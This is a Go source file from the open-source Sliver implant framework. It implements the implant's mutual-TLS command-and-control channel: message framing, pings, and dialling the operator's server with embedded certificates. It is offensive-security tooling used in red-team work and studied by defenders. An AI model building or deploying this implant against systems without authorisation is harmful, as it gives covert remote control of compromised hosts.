package mtls

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeMTLS}}

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	// PingInterval - Amount of time between in-band "pings"
	PingInterval = 2 * time.Minute

	// caCertPEM - PEM encoded CA certificate
	caCertPEM = `{{.Build.MtlsCACert}}`

	keyPEM  = `{{.Build.MtlsKey}}`
	certPEM = `{{.Build.MtlsCert}}`
)

// WriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the receiver can delimit messages properly
func WriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	if _, werr := connection.Write(dataLengthBuf.Bytes()); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Error writing data length: ", werr)
		// {{end}}
		return werr
	}
	if _, werr := connection.Write(data); werr != nil {
		// {{if .Config.Debug}}
		log.Print("Error writing data: ", werr)
		// {{end}}
		return werr
	}
	return nil
}

// WritePing - Send a "ping" message to the server
func WritePing(connection *tls.Conn) error {
	// {{if .Config.Debug}}
	log.Print("Socket ping")
	// {{end}}

	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
	envelope := pb.Envelope{
		Type: pb.MsgPing,
		Data: pingBuf,
	}
	return WriteEnvelope(connection, &envelope)
}

// ReadEnvelope - Reads a message from the TLS connection using length prefix framing
func ReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}
	n, err := io.ReadFull(connection, dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	if dataLength <= 0 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] read error: %s\n", err)
		// {{end}}
		return nil, errors.New("[mtls] zero data length")
	}

	dataBuf := make([]byte, dataLength)

	n, err = io.ReadFull(connection, dataBuf)

	if err != nil || n != dataLength {
		// {{if .Config.Debug}}
		log.Printf("Read error: %s\n", err)
		// {{end}}
		return nil, err
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// MtlsConnect - Get a TLS connection or die trying
func MtlsConnect(address string, port uint16) (*tls.Conn, error) {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

func getTLSConfig() *tls.Config {

	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Cannot load sliver certificate: %v", err)
		// {{end}}
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certPEM},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
			return cryptography.RootOnlyVerifyCertificate(caCertPEM, rawCerts, verifiedChains)
		},
	}
	// {{if .Config.Debug}}
	if cryptography.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
	}
	// {{end}}

	return tlsConfig
}

// {{end}} -IncludeMTLS
